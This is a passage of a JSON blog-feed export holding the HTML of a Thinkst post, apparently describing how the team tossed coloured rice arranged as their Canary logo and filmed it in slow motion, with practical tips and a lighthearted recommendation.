href=\"https://blogger.googleusercontent.com/img/a/AVvXsEhq46IJ0Awet6PXMtSxQBxf_s7Gbq_Ap5uY_pn2GQfm1vDZIQCbf1Pnj7PlWC8If4zCKfS2FcaImcm-J3mdWNNGdHyDEMAxaRRdkbKPnHlwchLs_VaRWe3vjH6nnq-agQ1NRY8kV3W4sRpEGduZUMemr1miinRIi6xWyKS_B2COpmQHMzNlwDPLq17X=s650\" style=\"margin-left: auto; margin-right: auto;\"><img border=\"0\" height=\"320\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEhq46IJ0Awet6PXMtSxQBxf_s7Gbq_Ap5uY_pn2GQfm1vDZIQCbf1Pnj7PlWC8If4zCKfS2FcaImcm-J3mdWNNGdHyDEMAxaRRdkbKPnHlwchLs_VaRWe3vjH6nnq-agQ1NRY8kV3W4sRpEGduZUMemr1miinRIi6xWyKS_B2COpmQHMzNlwDPLq17X=s320\" width=\"286\" /></a></td>\n</tr>\n<tr>\n<td class=\"tr-caption\" style=\"text-align: center;\">&#8220;TEST&#8221;</td>\n</tr>\n</tbody>\n</table>\n<div>\n<ul style=\"text-align: left;\">\n<li>Once we were happy with our flipping technique, we then created our logo using the coloured rice.\n<ul>\n<li>We packed the rice relatively densely to make sure that, when tossed, the logo came out as clear and vibrant as possible.</li>\n</ul>\n</li>\n</ul>\n</div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEgrXoBDo_sWg9ap7SGz1vTw2GHv2u6qi8yTvrHagWT2Vpeuyyf_jeSb3-8SWo6qPSG6s133M5T92EOcyQRKeChJxodYKmf3oXK7_CZFjVj0iFYoy4BdryGfWr0seicdDPXQ1WUhTwWTOeRns9mCoLOYz6ZRmWFgtSITCT6nx4rABeVxC7dyVVvS_jV8=s1280\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"394\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEgrXoBDo_sWg9ap7SGz1vTw2GHv2u6qi8yTvrHagWT2Vpeuyyf_jeSb3-8SWo6qPSG6s133M5T92EOcyQRKeChJxodYKmf3oXK7_CZFjVj0iFYoy4BdryGfWr0seicdDPXQ1WUhTwWTOeRns9mCoLOYz6ZRmWFgtSITCT6nx4rABeVxC7dyVVvS_jV8=w400-h394\" width=\"400\" /></a></div>\n<div>\n<ul style=\"text-align: left;\">\n<li>We got the cameras set up to capture the magic.\n<ul>\n<li>We used both a GoPro + the SlowMo setting on an iPhone. Whilst both worked, slowing down the GoPro footage in editing gave us better quality.</li>\n</ul>\n</li>\n<li>The next step was to toss our Canary logo\n<ul>\n<li>It took us 3 solid attempts to get our final result (with plenty of sweeping in between)</li>\n<li>We did not put down a sheet to capture the rice (because\u2026yolo), but we would recommend this method (unless you plan on finding runaway rice in all of your living room crevices for the next few days)</li>\n</ul>\n</li>\n</ul>\n</div>\n<h3 style=\"text-align: left;\">Ultimately&#8230;</h3>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://blogger.googleusercontent.com/img/a/AVvXsEj1n0RONKFG-IvNIIBu-_G-ty1bokQdtf1V4GSrDJUvqo9GPPEeHYNK9UhF1_By0HnVd3AKJ3hYOxwS47gcvuTbc_2hfDiulOACt41vlnUQclryRq7z_K6PZ44cryq2DikzILlJ_nM1hVpKOpqPs2x4yduKedqAOxp7R0YVLuhJdRXlm2ZtYrO27EKb=s746\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"399\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEj1n0RONKFG-IvNIIBu-_G-ty1bokQdtf1V4GSrDJUvqo9GPPEeHYNK9UhF1_By0HnVd3AKJ3hYOxwS47gcvuTbc_2hfDiulOACt41vlnUQclryRq7z_K6PZ44cryq2DikzILlJ_nM1hVpKOpqPs2x4yduKedqAOxp7R0YVLuhJdRXlm2ZtYrO27EKb=w400-h399\" width=\"400\" /></a></div>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"></div>\n<h3 style=\"text-align: left;\">Verdict</h3>\n<div>\n<div>Easy and cheap way to get creative (and certainly gave us a good laugh). Would recommend.</div>\n</div>\n<div></div>\n<div></div>"
                }
            ],
            "wfw_commentrss": "https://blog.thinkst.com/2022/01/canary-rice-toss.html/feed",
            "slash_comments": "0",
            "post-id": "25"
        }
    ]
}